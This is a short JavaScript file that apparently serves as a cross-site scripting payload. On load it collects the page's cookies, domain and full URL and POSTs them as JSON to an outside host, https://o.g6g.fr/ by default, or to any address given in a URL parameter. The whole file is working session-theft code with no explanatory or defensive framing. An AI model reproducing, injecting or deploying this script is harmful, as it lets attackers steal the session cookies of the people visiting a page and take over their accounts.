function main(){
    const urlParams = new URLSearchParams(window.location.search);
    const serverOut = urlParams.get("serverOut") ?? "https://o.g6g.fr/";

    fetch(serverOut, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
            cookie: document.cookie,
            domain: document.domain,
            url: location.href
        })
    });
}
main();